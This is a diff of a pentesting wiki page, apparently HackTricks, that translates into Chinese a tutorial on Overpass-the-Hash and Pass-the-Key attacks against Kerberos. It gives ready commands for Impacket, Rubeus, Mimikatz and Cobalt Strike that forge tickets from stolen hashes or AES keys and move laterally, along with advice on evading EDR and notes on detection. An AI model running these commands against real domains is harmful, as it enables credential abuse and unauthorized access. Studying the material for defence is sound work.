@@ -5,94 +5,92 @@
 
 ## Overpass The Hash/Pass The Key (PTK)
 
-**Overpass The Hash/Pass The Key (PTK)** attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network.
+**Overpass The Hash/Pass The Key (PTK)** 攻击适用于传统 NTLM 协议受限且 Kerberos authentication 占主导地位的环境。该攻击利用用户的 NTLM hash 或 AES keys 来请求 Kerberos tickets，从而未经授权访问网络中的资源。
 
-Strictly speaking:
+严格来说：
 
-- **Over-Pass-the-Hash** usually means turning the **NT hash** into a Kerberos TGT via the **RC4-HMAC** Kerberos key.
-- **Pass-the-Key** is the more generic version where you already have a Kerberos key such as **AES128/AES256** and request a TGT directly with it.
+- **Over-Pass-the-Hash** 通常是指通过 **RC4-HMAC** Kerberos key 将 **NT hash** 转换为 Kerberos TGT。
+- **Pass-the-Key** 是更通用的版本，适用于你已经拥有 **AES128/AES256** 等 Kerberos key，并直接使用它请求 TGT 的情况。
 
-This difference matters in hardened environments: if **RC4 is disabled** or no longer assumed by the KDC, the **NT hash alone is not enough** and you need an **AES key** (or the cleartext password to derive it).
+这一差异在加固环境中非常重要：如果 **RC4 被禁用**，或 KDC 不再默认使用 RC4，那么仅凭 **NT hash 不够**，你需要 **AES key**（或用于派生该 key 的明文密码）。
 
-To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.
+要执行此攻击，第一步是获取目标用户账户的 NTLM hash 或密码。获得这些信息后，即可为该账户获取 Ticket Granting Ticket（TGT），从而访问该用户有权限使用的服务或机器。
 
-The process can be initiated with the following commands:
+可以使用以下命令启动该过程：<sup>[[1]](#references)</sup>
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-对于需要 AES256 的场景，可以使用 `-aesKey [AES key]` 选项：
+对于需要 AES256 的场景，可以使用 `-aesKey [AES key]` 选项：<sup>[[1]](#references)</sup>
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
 export KRB5CCNAME=velociraptor.ccache
 python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
 ```
-`getTGT.py` 也支持使用 `-service <SPN>` 通过 **AS-REQ** 直接请求 **service ticket**，这在你想要针对特定 SPN 获取 ticket，而不需要额外的 TGS-REQ 时很有用：
+`getTGT.py` 还支持使用 `-service <SPN>` 通过 **AS-REQ 直接请求 service ticket**，当你想要获取特定 SPN 的 ticket 而不执行额外的 TGS-REQ 时，这会很有用：
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
 ```
-此外，获取到的 ticket 还可以配合多种工具使用，包括 `smbexec.py` 或 `wmiexec.py`，从而扩大攻击范围。
+此外，获取的 ticket 还可以与各种 tools 结合使用，包括 `smbexec.py` 或 `wmiexec.py`，从而扩大攻击范围。
 
-遇到诸如 _PyAsn1Error_ 或 _KDC cannot find the name_ 之类的问题，通常可以通过更新 Impacket 库，或使用 hostname 而不是 IP address 来解决，以确保与 Kerberos KDC 的兼容性。
+遇到 _PyAsn1Error_ 或 _KDC cannot find the name_ 等问题时，通常可以通过更新 Impacket library，或使用 hostname 替代 IP address 来解决，从而确保与 Kerberos KDC 兼容。
 
-使用 Rubeus.exe 的另一种命令序列展示了该技术的另一个方面：
+使用 Rubeus.exe 的另一组 command sequence 展示了该技术的另一个方面：<sup>[[1]](#references)</sup>
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-这种方法与 **Pass the Key** 方法类似，重点在于直接接管并利用 ticket 进行身份验证。实际上：
+此方法与 **Pass the Key** 方法类似，重点是劫持并直接利用票据进行身份验证。实际上：
 
-- `Rubeus asktgt` 直接发送 **raw Kerberos AS-REQ/AS-REP**，并且**不需要**管理员权限，除非你想通过 `/luid` 目标定位到另一个 logon session，或者通过 `/createnetonly` 创建一个单独的会话。
-- `mimikatz sekurlsa::pth` 会将 credential material 补丁写入一个 logon session，因此会**触及 LSASS**，这通常需要本地管理员或 `SYSTEM`，并且从 EDR 的角度看更容易被发现。
+- `Rubeus asktgt` 会自行发送 **raw Kerberos AS-REQ/AS-REP**，除非你希望使用 `/luid` targeting 另一个 logon session，或使用 `/createnetonly` 创建单独的 logon session，否则不需要管理员权限。
+- `mimikatz sekurlsa::pth` 会将凭据材料注入 logon session，因此会接触 **LSASS**，通常需要本地管理员权限或 `SYSTEM` 权限，并且从 EDR 的角度来看更加嘈杂。
 
 使用 Mimikatz 的示例：
 ```bash
 sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
 sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
 ```
-为了符合 operational security 并使用 AES256，可以应用以下命令：
+为符合操作安全要求并使用 AES256，可以执行以下命令：
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
-`/opsec` is relevant because Rubeus-generated traffic differs slightly from native Windows Kerberos. Also note that `/opsec` is intended for **AES256** traffic; using it with RC4 usually requires `/force`, which defeats much of the point because **RC4 in modern domains is itself a strong signal**.
+`/opsec` 之所以相关，是因为 Rubeus 生成的流量与原生 Windows Kerberos 略有不同。另请注意，`/opsec` 适用于 **AES256** 流量；将其与 RC4 一起使用通常需要 `/force`，这会削弱其大部分意义，因为在现代域中，**RC4 本身就是一个强信号**。
 
-## Detection notes
+## 检测说明
 
-Every TGT request generates **event `4768`** on the DC. In current Windows builds this event contains more useful fields than older writeups mention:
+每次 TGT 请求都会在 DC 上生成**事件 `4768`**。在当前 Windows 构建版本中，此事件包含的有用字段比旧版文章中提到的更多：
 
-- `TicketEncryptionType` tells you which enctype was used for the issued TGT. Typical values are `0x17` for **RC4-HMAC**, `0x11` for **AES128**, and `0x12` for **AES256**.
-- Updated events also expose `SessionKeyEncryptionType`, `PreAuthEncryptionType`, and the client's advertised enctypes, which helps distinguish **real RC4 dependence** from confusing legacy defaults.
-- Seeing `0x17` in a modern environment is a good clue that the account, host, or KDC fallback path still permits RC4 and is therefore more friendly to NT-hash-based Over-Pass-the-Hash.
+- `TicketEncryptionType` 用于表示签发的 TGT 所使用的 enctype。典型值包括：**RC4-HMAC** 对应 `0x17`，**AES128** 对应 `0x11`，**AES256** 对应 `0x12`。<sup>[[3]](#references)</sup>
+- 更新后的事件还会公开 `SessionKeyEncryptionType`、`PreAuthEncryptionType` 以及客户端声明的 enctypes，这有助于区分**真正依赖 RC4**的情况与容易造成混淆的旧版默认设置。
+- 在现代环境中看到 `0x17`，通常可以很好地说明该账户、主机或 KDC fallback 路径仍允许使用 RC4，因此更适合基于 NT hash 的 Over-Pass-the-Hash。
 
-Microsoft has been progressively reducing RC4-by-default behavior since the November 2022 Kerberos hardening updates, and the current published guidance is to **remove RC4 as the default assumed enctype for AD DCs by the end of Q2 2026**. From an offensive perspective, that means **Pass-the-Key with AES** is increasingly the reliable path, while classic **NT-hash-only OpTH** will keep failing more often in hardened estates.
+自 2022 年 11 月 Kerberos hardening 更新以来，Microsoft 一直在逐步减少默认使用 RC4 的行为；当前发布的指导建议在 **2026 年第二季度结束前，移除 RC4 作为 AD DC 的默认假定 enctype**。从攻击角度来看，这意味着 **使用 AES 的 Pass-the-Key** 正逐渐成为更可靠的路径，而经典的**仅依赖 NT hash 的 OpTH** 在经过 hardening 的环境中将越来越容易失败。<sup>[[3]](#references)</sup>
 
-For more details on Kerberos encryption types and related ticketing behaviour, check:
+有关 Kerberos encryption types 及相关 ticketing 行为的更多详情，请查看：
 
 {{#ref}}
 kerberos-authentication.md
 {{#endref}}
 
-## Stealthier version
+## 更隐蔽的版本
 
 > [!WARNING]
-> Each logon session can only have one active TGT at a time so be careful.
+> 每个 logon session 同时只能有一个处于活动状态的 TGT，因此请务必小心。
 
-1. Create a new logon session with **`make_token`** from Cobalt Strike.
-2. Then, use Rubeus to generate a TGT for the new logon session without affecting the existing one.
+1. 使用 Cobalt Strike 的 **`make_token`** 创建新的 logon session。
+2. 然后，使用 Rubeus 为新的 logon session 生成 TGT，而不会影响现有 session。
 
-You can achieve a similar isolation from Rubeus itself with a sacrificial **logon type 9** session:
+你也可以直接通过 Rubeus 使用一个临时的 **logon type 9** session 来实现类似的隔离：
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
-这可以避免覆盖当前会话的 TGT，而且通常比将 ticket 导入到你现有的 logon session 中更安全。
+这可以避免覆盖当前会话的 TGT，通常比将票据导入现有登录会话更安全。
 
+## 参考资料
 
-## References
-
-- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
-- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
-- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
-
+- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
+- [2] [GhostPack - Rubeus（GitHub repository）](https://github.com/GhostPack/Rubeus)
+- [3] [Microsoft Learn - 检测并修复 Kerberos 中的 RC4 使用](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
 
 {{#include ../../banners/hacktricks-training.md}}
